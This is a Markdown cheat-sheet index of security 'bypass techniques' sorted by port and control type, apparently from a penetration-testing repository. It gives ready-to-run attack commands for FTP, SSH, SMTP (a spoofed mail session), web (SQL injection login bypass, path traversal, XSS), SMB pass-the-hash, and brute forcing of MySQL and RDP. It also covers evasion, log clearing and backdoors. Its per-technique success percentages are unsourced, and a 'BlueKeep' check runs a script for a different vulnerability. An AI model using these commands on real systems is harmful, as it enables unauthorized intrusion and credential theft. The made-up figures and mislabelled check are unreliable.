# Complete Bypass Techniques Index

## Comprehensive Guide to Bypassing Security Controls

This document provides a complete index of bypass techniques for all common ports and protocols, organized by security control type.

---

## Quick Navigation

### By Port
- [Port 21 - FTP](#port-21-ftp)
- [Port 22 - SSH](#port-22-ssh)
- [Port 23 - Telnet](#port-23-telnet)
- [Port 25 - SMTP](#port-25-smtp)
- [Port 53 - DNS](#port-53-dns)
- [Port 80/443 - HTTP/HTTPS](#port-80443-httphttps)
- [Port 88 - Kerberos](#port-88-kerberos)
- [Port 139/445 - SMB](#port-139445-smb)
- [Port 161/162 - SNMP](#port-161162-snmp)
- [Port 3306 - MySQL](#port-3306-mysql)
- [Port 3389 - RDP](#port-3389-rdp)
- [Port 389/636 - LDAP/LDAPS](#port-389636-ldapldaps)
- [Port 5985/5986 - WinRM](#port-59855986-winrm)
- [Port 1433 - MSSQL](#port-1433-mssql)
- [Port 27017 - MongoDB](#port-27017-mongodb)
- [Port 5432 - PostgreSQL](#port-5432-postgresql)
- [Port 5900 - VNC](#port-5900-vnc)
- [Port 6379 - Redis](#port-6379-redis)

### By Control Type
- [Authentication Bypass](#authentication-bypass)
- [Firewall Bypass](#firewall-bypass)
- [Access Control Bypass](#access-control-bypass)
- [Rate Limiting Bypass](#rate-limiting-bypass)
- [Encryption Bypass](#encryption-bypass)
- [Detection Evasion](#detection-evasion)

---

## Port 21 - FTP

**Full Guide**: [Port_Specific_Attacks/Port_21_FTP/bypass_techniques.md](Port_Specific_Attacks/Port_21_FTP/bypass_techniques.md)

### Top 5 Bypass Techniques
1. **Passive Mode** (90% success) - Bypass firewall rules blocking active FTP
2. **Anonymous Login** (40% success) - Exploit misconfigured anonymous access
3. **SSH Tunnel** (85% success) - Tunnel FTP through allowed port 22
4. **Default Credentials** (30% success) - admin:admin, ftp:ftp
5. **Slow Brute Force** (60% success) - Avoid account lockout

### Quick Bypass
```bash
# Try anonymous first
ftp 192.168.1.100
# Username: anonymous
# Password: [blank]

# If blocked, tunnel through SSH
ssh -L 2121:192.168.1.100:21 user@jumphost
ftp localhost 2121
```

---

## Port 22 - SSH

**Full Guide**: [Port_Specific_Attacks/Port_22_SSH/bypass_techniques.md](Port_Specific_Attacks/Port_22_SSH/bypass_techniques.md)

### Top 5 Bypass Techniques
1. **Stolen SSH Keys** (80% success) - Use compromised private keys
2. **SSH Tunneling** (90% success) - ProxyJump through allowed host
3. **Default Credentials** (30% success) - root:root, pi:raspberry
4. **Slow Brute Force** (40% success) - Stay under fail2ban threshold
5. **IPv6 When IPv4 Blocked** (70% success) - Use IPv6 if available

### Quick Bypass
```bash
# Try default credentials
ssh pi@192.168.1.100  # Password: raspberry

# ProxyJump through allowed host
ssh -J user@allowed_host target@final_target

# Find and use stolen keys
find / -name id_rsa 2>/dev/null
ssh -i stolen_key user@target
```

---

## Port 25 - SMTP

**Full Guide**: [Port_Specific_Attacks/Port_25_SMTP/README.md](Port_Specific_Attacks/Port_25_SMTP/README.md#bypass-techniques)

### Top 5 Bypass Techniques
1. **Open Relay Test** (30% success) - Send mail through misconfigured server
2. **User Enumeration via VRFY** (50% success) - Enumerate valid email addresses
3. **Header Injection** (40% success) - Inject additional recipients
4. **TLS Downgrade** (25% success) - Force unencrypted communication
5. **SPF/DKIM Bypass** (20% success) - Spoof sender with weak validation

### Quick Bypass
```bash
# Test open relay
nmap -p 25 --script smtp-open-relay 192.168.1.100

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100

# Manual SMTP test
telnet 192.168.1.100 25
HELO attacker.com
MAIL FROM: <spoofed@legitimate.com>
RCPT TO: <victim@target.com>
```

---

## Port 53 - DNS

**Full Guide**: [Port_Specific_Attacks/Port_53_DNS/bypass_techniques.md](Port_Specific_Attacks/Port_53_DNS/bypass_techniques.md)

### Top 5 Bypass Techniques
1. **Alternative DNS Servers** (95% success) - Use 8.8.8.8, 1.1.1.1
2. **DNS over HTTPS** (90% success) - Encrypted DNS via port 443
3. **Direct IP Access** (85% success) - Skip DNS entirely
4. **Subdomain Brute Force** (80% success) - When zone transfer fails
5. **DNS Tunneling** (70% success) - Exfiltrate data or C2

### Quick Bypass
```bash
# Bypass DNS filtering
dig @8.8.8.8 blocked-site.com

# DNS over HTTPS
curl "https://cloudflare-dns.com/dns-query?name=example.com"

# Direct IP
curl http://93.184.216.34/  # Instead of example.com
```

---

## Port 80/443 - HTTP/HTTPS

**Full Guide**: [Port_Specific_Attacks/Port_80_443_HTTP/bypass_techniques.md](Port_Specific_Attacks/Port_80_443_HTTP/bypass_techniques.md)

### Top 5 Bypass Techniques
1. **SQL Injection Auth Bypass** (25% success) - admin' OR '1'='1
2. **Header Manipulation** (45% success) - X-Forwarded-For, X-Original-URL
3. **WAF Encoding** (40% success) - URL encode, case manipulation
4. **Path Traversal** (30% success) - ../../../etc/passwd
5. **Default Credentials** (35% success) - admin:admin on web panels

### Quick Bypass
```bash
# SQL injection login bypass
curl -X POST http://target/login -d "user=admin' OR '1'='1&pass=x"

# Header manipulation for admin access
curl -H "X-Original-URL: /admin" http://target/

# WAF bypass with encoding
<ScRiPt>alert(1)</sCrIpT>
```

---

## Port 139/445 - SMB

**Full Guide**: [Port_Specific_Attacks/Port_139_445_SMB/bypass_techniques.md](Port_Specific_Attacks/Port_139_445_SMB/bypass_techniques.md)

### Top 5 Bypass Techniques
1. **Pass-the-Hash** (70% success) - Use captured NTLM hashes directly
2. **Null Session** (15% success) - Anonymous SMB access
3. **SMB Relay** (50% success) - Relay captured auth to other hosts
4. **Default Credentials** (30% success) - administrator:password
5. **EternalBlue** (10% success) - Exploit MS17-010 on unpatched systems

### Quick Bypass
```bash
# Null session attempt
smbclient -L //192.168.1.100 -N

# Pass-the-Hash
crackmapexec smb 192.168.1.100 -u admin -H 'hash'

# Check for EternalBlue
nmap --script smb-vuln-ms17-010 192.168.1.100
```

---

## Port 3306 - MySQL

**Full Guide**: [Port_Specific_Attacks/Port_3306_MySQL/README.md](Port_Specific_Attacks/Port_3306_MySQL/README.md#bypass-techniques)

### Top 5 Bypass Techniques
1. **Default Credentials** (35% success) - root:root, root:[blank]
2. **Brute Force** (40% success) - Weak password cracking
3. **UDF Exploitation** (25% success) - User-Defined Functions for RCE
4. **SQL Injection** (30% success) - Extract data if accessible via web
5. **Configuration File Read** (20% success) - Read my.cnf for credentials

### Quick Bypass
```bash
# Try default/empty password
mysql -h 192.168.1.100 -u root -p
# Password: [blank] or root

# Brute force
hydra -l root -P passwords.txt mysql://192.168.1.100

# Check for anonymous login
mysql -h 192.168.1.100
```

---

## Port 3389 - RDP

**Full Guide**: [Port_Specific_Attacks/Port_3389_RDP/README.md](Port_Specific_Attacks/Port_3389_RDP/README.md#bypass-techniques)

### Top 5 Bypass Techniques
1. **Brute Force** (45% success) - Weak password attacks
2. **BlueKeep Exploit** (5% success) - CVE-2019-0708 on unpatched
3. **Credential Stuffing** (40% success) - Reuse from other breaches
4. **NLA Bypass** (30% success) - Network Level Authentication bypass
5. **Session Hijacking** (15% success) - Hijack active RDP sessions

### Quick Bypass
```bash
# Brute force
hydra -l Administrator -P passwords.txt rdp://192.168.1.100

# Check for BlueKeep
nmap --script rdp-vuln-ms12-020 192.168.1.100

  # Connect
  xfreerdp /u:admin /p:password /v:192.168.1.100
  ```

---

## Port 23 - Telnet

**Full Guide**: [Port_Specific_Attacks/Port_23_Telnet/README.md](Port_Specific_Attacks/Port_23_Telnet/README.md#bypass-techniques)

---

## Port 88 - Kerberos

**Full Guide**: [Port_Specific_Attacks/Port_88_Kerberos/README.md](Port_Specific_Attacks/Port_88_Kerberos/README.md#bypass-techniques)

---

## Port 161/162 - SNMP

**Full Guide**: [Port_Specific_Attacks/Port_161_162_SNMP/README.md](Port_Specific_Attacks/Port_161_162_SNMP/README.md#bypass-techniques)

---

## Port 389/636 - LDAP/LDAPS

**Full Guide**: [Port_Specific_Attacks/Port_389_636_LDAP/README.md](Port_Specific_Attacks/Port_389_636_LDAP/README.md#bypass-techniques)

---

## Port 5985/5986 - WinRM

**Full Guide**: [Port_Specific_Attacks/Port_5985_WinRM/README.md](Port_Specific_Attacks/Port_5985_WinRM/README.md#bypass-techniques)

---

## Port 1433 - MSSQL

**Full Guide**: [Port_Specific_Attacks/Port_1433_MSSQL/README.md](Port_Specific_Attacks/Port_1433_MSSQL/README.md#bypass-techniques)

---

## Port 27017 - MongoDB

**Full Guide**: [Port_Specific_Attacks/Port_27017_MongoDB/README.md](Port_Specific_Attacks/Port_27017_MongoDB/README.md#bypass-techniques)

---

## Port 5432 - PostgreSQL

**Full Guide**: [Port_Specific_Attacks/Port_5432_PostgreSQL/README.md](Port_Specific_Attacks/Port_5432_PostgreSQL/README.md#bypass-techniques)

---

## Port 5900 - VNC

**Full Guide**: [Port_Specific_Attacks/Port_5900_VNC/README.md](Port_Specific_Attacks/Port_5900_VNC/README.md#bypass-techniques)

---

## Port 6379 - Redis

**Full Guide**: [Port_Specific_Attacks/Port_6379_Redis/README.md](Port_Specific_Attacks/Port_6379_Redis/README.md#bypass-techniques)

---

## By Control Type

### Authentication Bypass

**Universal Techniques**:
1. **Default Credentials** - Try vendor defaults first
2. **SQL Injection** - `admin' OR '1'='1`
3. **Brute Force** - Slow and targeted
4. **Credential Theft** - Sniff, steal, or harvest
5. **Session Hijacking** - Steal active sessions

**Tools**:
- Hydra, Medusa, Ncrack (brute force)
- SQLMap (SQL injection)
- Responder (credential harvesting)
- Wireshark, tcpdump (sniffing)

### Firewall Bypass

**Universal Techniques**:
1. **Port Tunneling** - SSH tunnel through allowed ports
2. **Protocol Tunneling** - DNS, ICMP, HTTP tunneling
3. **Fragmentation** - Fragment packets to evade inspection
4. **Source Port Manipulation** - Use port 53, 80, 443 as source
5. **IPv6** - Bypass IPv4-only firewall rules

**Tools**:
- SSH (-L, -R, -D flags)
- iodine, dnscat2 (DNS tunnel)
- ptunnel (ICMP tunnel)
- Nmap (fragmentation, source port)

### Access Control Bypass

**Universal Techniques**:
1. **Path Traversal** - `../../etc/passwd`
2. **Header Manipulation** - X-Original-URL, X-Forwarded-For
3. **HTTP Verb Tampering** - Try GET, PUT, DELETE, etc.
4. **Parameter Pollution** - `?id=1&id=2`
5. **API Version Downgrade** - Try /api/v1 instead of /api/v2

**Tools**:
- Burp Suite (request modification)
- curl (header manipulation)
- Postman (API testing)

### Rate Limiting Bypass

**Universal Techniques**:
1. **IP Rotation** - Tor, proxies, VPN
2. **Header Spoofing** - X-Forwarded-For rotation
3. **Session Rotation** - New cookies/sessions
4. **Slow Down** - Stay under threshold
5. **Distributed Attack** - Multiple sources

**Tools**:
- proxychains, Tor
- Cloud instances (multiple IPs)
- Custom scripts for timing

### Encryption Bypass

**Universal Techniques**:
1. **SSL Stripping** - MITM downgrade HTTPS to HTTP
2. **Certificate Validation Bypass** - Ignore cert errors
3. **Protocol Downgrade** - Force older, weaker protocols
4. **Man-in-the-Middle** - ARP poisoning + SSL strip
5. **Weak Cipher Exploitation** - Force weak ciphers

**Tools**:
- Bettercap (SSL stripping)
- sslstrip (legacy)
- MITMproxy
- testssl.sh (cipher testing)

### Detection Evasion

**Universal Techniques**:
1. **Slow Timing** - Nmap -T0, -T1
2. **Fragmentation** - Split packets
3. **Obfuscation** - Encoding, encryption
4. **Legitimate Tools** - Use built-in OS tools
5. **Clean Up** - Remove logs, artifacts

**Tools**:
- Nmap (timing, fragmentation)
- Proxychains (attribution hiding)
- Tor (anonymity)

---

## Bypass Success Matrix

| Port/Service | Easiest Bypass | Hardest Bypass | Overall Difficulty |
|--------------|----------------|----------------|-------------------|
| FTP (21) | Passive Mode | Version Exploits | Easy |
| SSH (22) | Stolen Keys | 2FA Bypass | Medium |
| SMTP (25) | Open Relay | SPF/DKIM | Easy |
| DNS (53) | Alt DNS Server | Cache Poisoning | Easy |
| HTTP (80/443) | Default Creds | WAF Bypass | Medium |
| SMB (139/445) | Null Session | SMB Signing | Medium |
| MySQL (3306) | Default Creds | Strong Auth | Easy |
| RDP (3389) | Brute Force | NLA with 2FA | Medium |

---

## General Bypass Strategy

### Phase 1: Reconnaissance (Low Risk)
1. Identify security controls in place
2. Check for default configurations
3. Enumerate versions and technologies
4. Map attack surface

### Phase 2: Easy Wins (Medium Risk)
1. Try default credentials
2. Test for anonymous/guest access
3. Check for misconfigurations
4. Attempt simple bypasses

### Phase 3: Targeted Attacks (High Risk)
1. Brute force with smart wordlists
2. Exploit known vulnerabilities
3. Advanced evasion techniques
4. Custom exploit development

### Phase 4: Persistence
1. Maintain access
2. Clean logs
3. Establish backdoors
4. Lateral movement

---

## Important Reminders

1. **Always get authorization** before testing
2. **Test in safe environments** (labs, CTFs, authorized targets)
3. **Document bypass methods** for reporting
4. **Verify bypass success** before proceeding
5. **Combine techniques** for better results
6. **Stay updated** on new bypasses and patches
7. **Ethical use only** - these are for defense and authorized testing

---

## Additional Resources

- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings

---

**Last Updated**: 2026-06-16
**Maintained by**: Network Security Community
